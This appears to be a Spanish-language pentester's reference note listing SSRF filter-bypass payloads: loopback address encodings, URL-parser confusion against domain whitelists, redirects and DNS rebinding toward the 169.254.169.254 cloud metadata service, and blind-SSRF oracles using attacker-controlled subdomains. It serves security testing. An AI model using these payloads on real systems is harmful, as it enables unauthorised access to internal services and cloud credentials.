---
tipo: meta
aliases:
  - Evasión SSRF
  - Bypass de filtros de URL
tags:
  - meta/referencia
  - dominio/web
---

# SSRF evasión - matriz de referencia

> [!info] Referencia pura, no un zettel
> Una sección por tipo de filtro, en el mismo orden que el árbol de obstáculos de [[MOC - SSRF]]. Las primitivas se combinan.

## Lista negra de IP

El filtro más común y el más fácil de romper: hay demasiadas formas de escribir la misma dirección.

`http://127.1/`
`http://127.0.1/`
Formas cortas. El sistema completa los octetos que faltan.

`http://2130706433/`
Decimal. Es `127.0.0.1` como entero de 32 bits.

`http://0x7f000001/`
`http://0x7f.0x0.0x0.0x1/`
Hexadecimal, entero o por octeto.

`http://0177.0.0.1/`
`http://0177.0000.0000.0001/`
Octal. El cero inicial es lo que dispara la interpretación.

`http://0/`
`http://0.0.0.0/`
En Linux, `0.0.0.0` alcanza servicios en loopback. Casi nunca está en la lista negra.

`http://[::1]/`
`http://[::ffff:127.0.0.1]/`
`http://[0:0:0:0:0:ffff:7f00:1]/`
IPv6, incluida la forma que mapea IPv4. Muchos filtros solo validan IPv4.

`http://127.0.0.1.nip.io/`
`http://localtest.me/`
`http://lvh.me/`
Dominios públicos que resuelven a loopback. Saltan cualquier filtro que valide texto en vez de resolver.

Combinar suma: `http://0x7f.1/` es hexadecimal más forma corta a la vez.

## Lista blanca de dominios

`http://objetivo.com@127.0.0.1/`
La parte previa a `@` es la credencial, no el host. El destino real es lo que sigue. Es el bypass más productivo contra parsers artesanales.

`http://127.0.0.1#objetivo.com/`
El fragmento se descarta al conectar. Un filtro que busque la cadena `objetivo.com` la encuentra.

`http://127.0.0.1?x=objetivo.com`
Igual, con el dominio permitido en la consulta.

`http://objetivo.com.atacante.com/`
Sufijo. Rompe cualquier validación por "contiene" o "empieza con".

`http://atacante.com/objetivo.com`
El dominio permitido en la ruta.

`http://objetivo.com\@atacante.com/`
`http://objetivo.com\.atacante.com/`
Barra invertida: distintos parsers la normalizan distinto, y esa discrepancia es el hueco. Es la base de toda la confusión de parsers.

**Dominio propio que resuelve a IP interna.** Si el filtro valida el nombre y no la IP resuelta, registrar un dominio con un registro A apuntando a `127.0.0.1` lo pasa limpio. No hay trucos de sintaxis: la validación simplemente mira la cosa equivocada.

## Validación antes de la petición

Cuando la app valida la URL y **después** la pide, hay una ventana entre ambas cosas.

**Redirección.** Se apunta a un servidor propio que responde `302` hacia `http://169.254.169.254/`. La URL validada era legítima; la que se sigue, no. Es el bypass más confiable, y por eso "no seguir redirecciones" es una mitigación de peso.

`http://atacante.com/r` → `Location: http://169.254.169.254/latest/meta-data/`

Vale probar también `307`, que preserva el método y el cuerpo — necesario para llegar a IMDSv2.

**DNS rebinding.** El nombre se resuelve dos veces: una para validar y otra para conectar. Con TTL en cero y un servidor que alterna entre una IP pública y una interna, la validación ve la pública y la conexión va a la interna. Es la respuesta a los filtros que resuelven bien pero no atan la conexión a la IP validada.

Cuesta infraestructura y es intermitente por naturaleza: hay que insistir.

## Codificación

`http://127.0.0.1%2f%2e%2e%2f`
Codificación simple de la ruta.

`http://127.0.0.1%252f`
Doble codificación, cuando algo decodifica una vez y algo más decodifica otra.

`http://①②⑦.⓪.⓪.①/`
Caracteres Unicode que ciertas bibliotecas normalizan a dígitos ASCII. Frágil y muy dependiente de la versión; vale la prueba porque cuesta poco.

`http://127.0.0.1./`
Punto final: nombre de dominio absoluto. Cambia la cadena sin cambiar el destino.

## Confirmar sin respuesta

Para [[SSRF - canal ciego]], cuando no vuelve nada.

`http://<único>.atacante.com/`
Interacción externa. Un subdominio distinto por prueba, o la caché de DNS anula la segunda.

`http://127.0.0.1:80/` vs `http://127.0.0.1:1/`
Oráculo de puerto: el primero conecta, el segundo se rechaza. Si las respuestas difieren, hay canal.

`http://127.0.0.1:11211/` vs `http://192.0.2.1/`
Puerto abierto contra IP inexistente: distingue "cerrado" de "sin ruta". La segunda dirección es de documentación y nunca existe.

`http://interno:8080/a` vs `http://interno:8080/b`
Con un oráculo de estado o de tamaño, se enumeran rutas del servicio interno sin verlas.

## Cuando nada entra

Si la validación resuelve el nombre, compara contra una lista blanca, no sigue redirecciones y ata la conexión a la IP validada, no hay bypass de URL: está bien hecha. El camino pasa a ser otra superficie —ver [[SSRF superficies - matriz de referencia]]— o aceptar que el SSRF es de alcance limitado y reportarlo como tal.
